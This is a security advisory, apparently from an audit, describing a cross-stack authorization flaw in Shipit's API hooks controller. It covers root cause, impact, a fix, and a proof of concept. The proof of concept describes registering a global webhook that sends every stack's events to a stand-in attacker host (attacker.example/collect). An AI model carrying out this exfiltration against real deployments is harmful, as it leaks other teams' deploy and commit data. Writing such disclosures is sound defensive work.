### Title
Stack-scoped API token can register a global webhook to read task/deploy/commit events from every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::ApiClient` tokens can be scoped to a single stack via the `stack_id` column, and `Api::BaseController#stacks`/`#stack` deliberately restrict what an `ApiClient` can read or act on to that one stack. [1](#0-0)  `Api::HooksController`, however, only checks the generic `read:hook`/`write:hook` permission and never re-applies that stack-scoping when the client hits the top-level, un-nested `/api/hooks` route, letting a stack-scoped token create a *global* webhook that receives events for every stack in the instance.

### Finding Description
`ApiClient` authorization is meant to be bound by `stack_id`: `stacks` in the base controller returns only the client's own stack when `current_api_client.stack_id?` is true, and `Stack.all` otherwise. [2](#0-1)  This is the authorization invariant: *the set of stacks a token authorises == the set of stacks it can touch*.

`Api::HooksController` breaks that binding. Its permission checks are only `require_permission :read, :hook` / `require_permission :write, :hook`, with no additional check tying the operation to the client's `stack_id`: [3](#0-2) 

The `hooks` and `stack_id` helper methods determine scope purely from the request path, not from the authenticated client's own scope: [4](#0-3) 

`config/routes.rb` exposes `HooksController#create` both nested under a stack (`/api/stacks/*stack_id/hooks`) and at the top level with no stack in the path (`/api/hooks`): [5](#0-4) 

When the top-level route is used, `params[:stack_id]` is absent, so `stack_id` returns `nil`, and the hook is created with `stack_id: nil`, i.e. a **global** hook: [6](#0-5) 

`Shipit::Hook.deliver` (invoked from `Hook.emit` for every `stack`, `deploy`, `rollback`, `task`, `commit_status`, `merge_status`, `lock`, `pull_request`, `merge` event) fans out to any hook whose `stack_id` matches the event's stack **or is `nil`**: [7](#0-6) [8](#0-7) 

So a global hook (`stack_id: nil`) receives deploy/task/rollback/commit-status/lock/merge events for **every stack** managed by the Shipit instance, not just the stack the requesting `ApiClient` is authorized for. Nothing in `Api::HooksController#create`/`#update` rejects a `nil` `stack_id` when `current_api_client.stack_id` is set, so a token that was only meant to see one repository's events can register a listener that silently exfiltrates activity (deploy status, commit shas, task names/output URLs, lock reasons, merge queue state) for every other repository/stack in the instance to an attacker-controlled `delivery_url`.

### Impact Explanation
This is a cross-stack authorization escalation: a token scoped to stack A (e.g., an integration credential intentionally restricted via `ApiClient#stack_id` and holding only `write:hook`/`read:hook`) can obtain continuous, unauthenticated-to-them read access to deploy/task/commit/lock state for stacks it was never granted `read:stack` on, by pointing a global webhook at an attacker-controlled URL. This matches the "unauthenticated read of stack state, task streams or deploy output" High-severity class, since it lets a narrowly-scoped credential effectively read the state of arbitrary stacks it was not authorized for, via a side channel (webhook delivery) rather than the API's own stack-scoping.

### Likelihood Explanation
Requires only a valid, already-issued `ApiClient` token that carries `write:hook` (or `read:hook`/`write:hook` from the fixed permission set) — no additional secrets, no session, and no repository write access are needed. Any organization that issues stack-scoped API tokens with hook permissions (a normal, documented use case for CI integrations) is exposed; the attacker simply calls `POST /api/hooks` instead of the intended `POST /api/stacks/:stack_id/hooks`.

### Recommendation
In `Api::HooksController`, when `current_api_client.stack_id?` is true, force `stack_id` to `current_api_client.stack_id` (ignore/override any client-supplied absence of `stack_id`) and reject requests that would otherwise create/read/update a hook outside the client's authorized stack, mirroring the scoping already enforced by `Api::BaseController#stacks`/`#stack`.

### Proof of Concept
1. Admin creates an `ApiClient` scoped to `stack: shipit` (sets `stack_id`) with permissions `['read:hook', 'write:hook']`, intended only to manage that stack's webhooks (analogous to fixture `here_come_the_walrus`, which shows `stack:`-scoped clients exist). [9](#0-8) 
2. Attacker holding that token sends `POST /api/hooks` (top-level route, no `stack_id` in path) with `{ delivery_url: "https://attacker.example/collect", events: ["deploy","task","commit_status","lock"] }`.
3. `HooksController#create` computes `stack_id` as `nil` (since `params[:stack_id]` is absent) and persists a global `Hook`. [10](#0-9) [11](#0-10) 
4. Any other stack in the instance runs a deploy/task/rollback and calls `Hook.emit`; `Hook.deliver` matches the global hook via `for_stack(stack_id) = where(stack_id: [nil, stack_id])` and POSTs the event payload to the attacker's `delivery_url`. [7](#0-6) [8](#0-7) 
5. The attacker now continuously receives deploy/task/commit/lock data for stacks it was never granted `read:stack`/`read:hook` on via `Api::BaseController#stacks`.
